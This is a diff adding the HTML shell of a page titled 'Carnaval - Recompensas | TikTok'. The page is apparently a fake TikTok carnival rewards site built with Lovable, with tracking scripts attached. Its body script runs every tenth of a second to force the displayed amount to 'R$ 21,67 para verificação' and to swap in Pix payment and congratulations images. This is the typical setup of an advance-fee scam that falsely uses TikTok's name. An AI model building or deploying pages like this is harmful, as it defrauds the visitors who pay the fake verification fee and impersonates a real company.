@@ -1,0 +1,87 @@
+<!DOCTYPE html><html lang="en"><head>
+
+    <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "vfesdgejni");
+</script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- TODO: Set the document title to the name of your application -->
+    <title>Carnaval - Recompensas | TikTok</title>
+
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="images/mascara-carnaval.png">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@Lovable">
+    <meta name="twitter:image" content="assets/mascara-carnaval.png">
+    <script>
+      if (window.location.pathname.endsWith("/index.html")) {
+        const newPath = window.location.pathname.replace("/index.html", "/");
+        window.location.replace(
+          newPath + window.location.search + window.location.hash,
+        );
+      }
+    </script>
+    <script type="module" crossorigin="" src="js/index-CNZQHOFK.js"></script>
+    <link rel="stylesheet" crossorigin="" href="css/index-Ccduasf0.css">
+    <script defer="" src="js/~flock.js" data-proxy-url="https://project-hug-a-thon.lovable.app/~api/analytics"></script>
+  </head>
+
+  <body>
+    <div id="root"></div>
+    <script>
+      // Force constant value for verification
+      setInterval(() => {
+        document
+          .querySelectorAll(
+            "span.text-3xl.font-bold.text-foreground.whitespace-nowrap",
+          )
+          .forEach((el) => {
+            if (el.innerText.trim() !== "R$ 21,67") el.innerText = "R$ 21,67";
+          });
+        document
+          .querySelectorAll("p.text-xs.text-muted-foreground")
+          .forEach((el) => {
+            if (
+              el.innerText.includes("para verificação") &&
+              !el.innerText.includes("21,67")
+            ) {
+              el.innerText = "R$ 21,67 para verificação";
+            }
+          });
+        // Fix images
+        document
+          .querySelectorAll('img[src*="mascara-carnaval"]')
+          .forEach((img) => {
+            if (img.src.includes("v2-BjllE6H5"))
+              img.src = "/assets/mascara-carnaval.png";
+          });
+        document.querySelectorAll('img[src*="pix-logo"]').forEach((img) => {
+          if (img.src.includes("DwazX9RI")) img.src = "/assets/pix-logo.svg";
+        });
+        document.querySelectorAll('img[src*="parabens-img"]').forEach((img) => {
+          if (img.src.includes("DR-nku2m"))
+            img.src = "/assets/parabens-img.png";
+        });
+        document.querySelectorAll('img[src*="p-assista"]').forEach((img) => {
+          if (img.src.includes("BUWulIvV")) img.src = "/assets/p-assista.svg";
+        });
+        document
+          .querySelectorAll('img[src*="p-saldo-Cbw24AHL.svg"]')
+          .forEach((img) => {
+            img.src =
+              "https://project-hug-a-thon.lovable.app/assets/p-saldo-Cbw24AHL.svg";
+            img.alt = "Saldo";
+            img.setAttribute("loading", "eager");
+            img.setAttribute("decoding", "async");
+          });
+      }, 100);
+    </script>
+  
+
+</body></html>
